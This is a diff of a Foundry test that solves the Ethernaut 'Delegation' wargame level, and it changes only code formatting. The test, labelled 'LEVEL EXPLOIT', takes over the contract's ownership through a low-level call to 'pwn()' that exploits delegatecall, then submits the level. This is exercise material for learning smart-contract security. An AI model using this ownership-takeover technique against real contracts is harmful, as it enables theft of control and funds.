@@ -41,37 +41,25 @@ contract DelegationTest is Test {
         Delegation delegationContract = Delegation(levelAddress);
 
         emit log_named_address("Eve's address: ", address(eve));
-        emit log_named_address(
-            "Original owner of the Delegation contract: ",
-            address(delegationContract.owner())
-        );
+        emit log_named_address("Original owner of the Delegation contract: ", address(delegationContract.owner()));
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
         emit log_string("Starting the exploit... 🧨");
-        emit log_string(
-            "Making a low-level call to the Delegation contract..."
-        );
+        emit log_string("Making a low-level call to the Delegation contract...");
 
-        (bool success, ) = address(delegationContract).call(
-            abi.encodeWithSignature("pwn()")
-        );
+        (bool success,) = address(delegationContract).call(abi.encodeWithSignature("pwn()"));
         require(success, "Transaction failed");
 
-        emit log_named_address(
-            "Ownership transferred to: ",
-            address(delegationContract.owner())
-        );
+        emit log_named_address("Ownership transferred to: ", address(delegationContract.owner()));
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
         //////////////////////////////////////////////////////////////*/
 
-        bool challengeCompleted = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(challengeCompleted);
     }
@@ -89,9 +77,7 @@ contract DelegationTest is Test {
      * an address for that person
      */
     function makeNameForAddress(string memory name) public returns (address) {
-        address addr = address(
-            uint160(uint256(keccak256(abi.encodePacked(name))))
-        );
+        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
         vm.label(addr, name);
         return addr;
     }
